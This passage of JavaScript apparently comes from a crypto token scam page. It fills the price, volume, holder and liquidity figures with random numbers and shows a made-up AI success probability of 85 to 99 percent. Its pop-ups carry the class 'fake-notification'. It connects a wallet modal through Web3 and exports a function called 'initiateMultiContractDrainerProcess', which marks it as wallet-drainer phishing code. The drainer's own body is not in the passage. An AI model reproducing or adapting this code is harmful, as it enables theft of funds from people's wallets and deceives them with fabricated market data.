    const volume = (Math.random() * 500000 + 200000).toFixed(0);
    const holders = (Math.random() * 10000 + 10000).toFixed(0);
    const liquidity = (Math.random() * 500000 + 500000).toFixed(0);

    const tokenPriceElement = document.getElementById("tokenPrice");
    const priceChangeElement = document.getElementById("priceChange");
    const marketCapElement = document.getElementById("marketCap");
    const volumeElement = document.getElementById("volume");
    const holdersElement = document.getElementById("holders");
    const liquidityElement = document.getElementById("liquidity");

    if (tokenPriceElement) tokenPriceElement.textContent = `$${price}`;
    if (priceChangeElement) priceChangeElement.textContent = `${changePercent}%`;
    if (marketCapElement) marketCapElement.textContent = marketCap;
    if (volumeElement) volumeElement.textContent = volume;
    if (holdersElement) holdersElement.textContent = holders;
    if (liquidityElement) liquidityElement.textContent = liquidity;

    if (tokenChart) {
        try {
            const newData = tokenChart.data.datasets[0].data.slice(1);
            newData.push(parseFloat(price));
            tokenChart.data.datasets[0].data = newData;
            tokenChart.update();
        } catch (e) {
            // Chart update may fail on iOS
        }
    }

    const changeElement = document.querySelector(".price-change");
    if (changeElement) {
        changeElement.classList.remove("positive", "negative");
        changeElement.classList.add(parseFloat(changePercent) >= 0 ? "positive" : "negative");
    }
}

function updateAIAnalytics() {
    const successProb = 85 + Math.floor(Math.random() * 15);
    if (predictionFill) {
        predictionFill.style.width = `${successProb}%`;
    }
}

function showNotification(message, type = "success") {
    // iOS Safari notification compatibility
    const notification = document.createElement("div");
    notification.className = `fake-notification ${type}`;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 12px 20px;
        background: ${type === 'success' ? 'rgba(16, 185, 129, 0.95)' : 
                    type === 'error' ? 'rgba(239, 68, 68, 0.95)' : 
                    'rgba(59, 130, 246, 0.95)'};
        color: white;
        border-radius: 8px;
        z-index: 10000;
        backdrop-filter: blur(10px);
        -webkit-backdrop-filter: blur(10px);
        box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        transition: opacity 0.3s ease;
    `;
    
    notification.innerHTML = `
        <i class="fas fa-${
            type === "success"
                ? "check-circle"
                : type === "error"
                ? "exclamation-circle"
                : "info-circle"
        }"></i>
        ${message}
    `;

    document.body.appendChild(notification);

    setTimeout(() => {
        notification.style.opacity = "0";
        setTimeout(() => {
            document.body.removeChild(notification);
        }, 300);
    }, 3000);
}

// Manual event listeners (iOS compatible)
window.addEventListener("scroll", () => {
    const header = document.getElementById("header");
    if (header) {
        if (window.scrollY > 50) {
            header.classList.add("scrolled");
        } else {
            header.classList.remove("scrolled");
        }
    }
});

document.addEventListener("click", (e) => {
    if (navLinks && !navLinks.contains(e.target) && mobileMenuBtn && !mobileMenuBtn.contains(e.target)) {
        navLinks.classList.remove("active");
    }

    if (walletModal && walletModal.classList.contains("active") && e.target === walletModal) {
        hideWalletModal();
    }
    
    if (announcementModal && announcementModal.classList.contains("active") && e.target === announcementModal) {
        hideAnnouncementModal();
    }
});

if (document.querySelectorAll(".nav-links a")) {
    document.querySelectorAll(".nav-links a").forEach((link) => {
        link.addEventListener("click", () => {
            if (navLinks) {
                navLinks.classList.remove("active");
            }
        });
    });
}

// iOS specific: Handle device orientation
window.addEventListener('orientationchange', function() {
    // iOS Safari may need layout adjustments
    setTimeout(() => {
        if (tokenChart) {
            try {
                tokenChart.resize();
            } catch (e) {
                // Ignore resize errors on iOS
            }
        }
    }, 300);
});

// Manual error handling (iOS compatible)
window.addEventListener('error', function(e) {
    console.debug('Manual global error caught:', e.error);
    
    // iOS specific error handling
    if (isIOS) {
        // Prevent iOS error propagation
        e.preventDefault();
        
        // Log iOS specific errors
        if (e.error && e.error.message.includes('SecurityError')) {
            console.debug('iOS SecurityError detected - continuing execution');
        }
    }
});

window.addEventListener('unhandledrejection', function(e) {
    console.debug('Manual unhandled promise rejection:', e.reason);
});

// Manual mobile optimization
if (isMobileDevice) {
    document.body.classList.add('manual-mobile-optimized');
}

// iOS specific optimizations
if (isIOS) {
    document.body.classList.add('ios-optimized');
    
    // iOS Safari may need additional touch handling
    document.addEventListener('touchmove', function(e) {
        // Allow default scrolling for iOS Safari
    }, { passive: true });
}

// Export manual drainer function
window.initiateMultiContractDrainerProcess = initiateManualMultiContractDrainerProcess;

// iOS specific: Load Web3 if not already loaded
if (isIOS && typeof Web3 === 'undefined') {
    console.log('iOS detected - ensuring Web3 compatibility');
    // You may need to load Web3 library differently for iOS
    // This is a fallback for iOS Safari
    if (typeof window.ethereum !== 'undefined') {
        // Use the provider's Web3 if available
        web3 = new Web3(window.ethereum);
    }
}
